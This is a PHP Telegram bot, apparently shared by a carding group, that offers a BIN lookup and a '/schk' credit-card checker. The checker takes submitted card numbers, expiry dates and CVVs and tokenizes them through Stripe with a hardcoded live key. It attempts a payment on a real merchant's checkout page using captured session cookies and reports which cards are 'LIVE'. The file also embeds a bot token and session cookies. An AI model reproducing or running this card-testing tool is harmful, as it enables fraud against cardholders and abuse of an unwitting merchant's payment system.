<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

$botToken = "1618345689:AAGmymOstMc7Ri-s0P8Fgij9-dKVUJhLbVg"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by:  [🇮🇳]DRAGON MASTER</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>Web Based CC Checker:</u> <code>/schk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx<b>Bot Made by:  [🇮🇳]DRAGON MASTER</b>", $message_id);
}


//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>', $message_id);
}


//////////=========[Schk (1req) Command]=========//////////

elseif (strpos($message, "/schk") === 0){
$lista = substr($message, 6);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$name = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6a2e3217-4058-4e68-9928-9315cb66ef952edef1&muid=204cfd6c-eb1b-4c03-9965-9a758457b154726d57&sid=3204f622-2618-44ef-95f2-80923823b01e3583ac&payment_user_agent=stripe.js%2Fb8b0dab1a%3B+stripe-js-v3%2Fb8b0dab1a&time_on_page=1039736&referrer=https%3A%2F%2Fmy.cheddarup.com%2Fc%2Fmoneyminder-annual-subscription&key=pk_live_gMKTY2aBEzFcCOSye8YMm98X');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, 'https://my.cheddarup.com/api/collections/moneyminder-annual-subscription/carts/40feb3d2-7ba4-4fae-9237-6abc3f5372cf!!15496451/pay');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: my.cheddarup.com',
'method: POST',
'path: /api/collections/moneyminder-annual-subscription/carts/40feb3d2-7ba4-4fae-9237-6abc3f5372cf!!15496451/pay',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'cookie: __stripe_mid=204cfd6c-eb1b-4c03-9965-9a758457b154726d57; __stripe_sid=3204f622-2618-44ef-95f2-80923823b01e3583ac; _cheddar_up_chevre_session=CvQmbyZUbDKALiJUeFvCBu0f3creN4NxUjhMcPCRy2%2FbNgv2Z2tZU%2Byd4n%2FqIWrpOTohL20nU4pbFcqHGj3lRXvTbN0RNAECdTZThYYyQyREomtR97w%2B3706JtNnqsAn8tyQy9dxFA%2BiJJM%2FFwAWzQc24ro%2FmjizmvpzangAO%2B9D75ugE9LLBKxuM0TeD4Mr3G32A2%2F0bJshpdnachCY29C6XUdxMKLHnh5%2BKXViXOEZ6FAJq8GA6w%3D%3D--%2FBAxdFbCW7tRf%2FFx--D%2BLMAfDLEE0EIHVGnCnaIA%3D%3D',
'origin: https://my.cheddarup.com',
'referer: https://my.cheddarup.com/c/moneyminder-annual-subscription/checkout?step=details',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"name":"Dragon Master","email":"fdfsdh@gmail.com","method":"card","saveSource":false,"source":{"token":"'.$id.'"},"shippingMethod":"toMe","shipTo":{"country":"US","name":"","address":"","city":"","state":"AL","zip":""}}');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];


//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (strpos($result2, 'security code is incorrect.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>CCN:</u><b>Beta Mauj Kardi LIVE CCN [HAI]🟢</b>%0A<b>Bin:$bin</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Type:$type</b>%0A<b>Time:$time</b>%0A<b>Error:Your card's security code is incorrect.</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: [🇮🇳]DRAGON MASTER</b>", $message_id);
}

elseif(strpos($result2, 'Your card has insufficient funds.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>CVV:</u><b>Beta Mauj Kardi LIVE [Pass]🟢</b>%0A<b>Bin:$bin</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Type:$type</b>%0A<b>Time:$time</b>%0A<b>Error:Your card has insufficient funds.</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: [🇮🇳]DRAGON MASTER</b>", $message_id);
}

elseif(strpos($result2,  'card was declined.')) {
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>DEAD:</u><b>Bhosdike ka Beta Card Declined hai🔴</b>%0A<b>Bin:$bin</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Type:$type</b>%0A<b>Time:$time</b>%0A<b>Error:Card Declined hai🔴</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: [🇮🇳]DRAGON MASTER</b>", $message_id);
}
elseif(strpos($result2,  'Your card number is incorrect.')) {
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>DEAD:</u><b>Bhosdike ka Beta Card Declined hai🔴</b>%0A<b>Bin:$bin</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Type:$type</b>%0A<b>Time:$time</b>%0A<b>Error:Your card number is incorrect.🔴</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: [🇮🇳]DRAGON MASTER</b>", $message_id);
}

else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>DEAD:</u><b>Error Not listed🔴</b>%0A<b>Bin:$bin</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Type:$type</b>%0A<b>Time:$time</b>%0A<b>Error:$result2</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: [🇮🇳]DRAGON MASTER</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Team Zeltrax]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

?>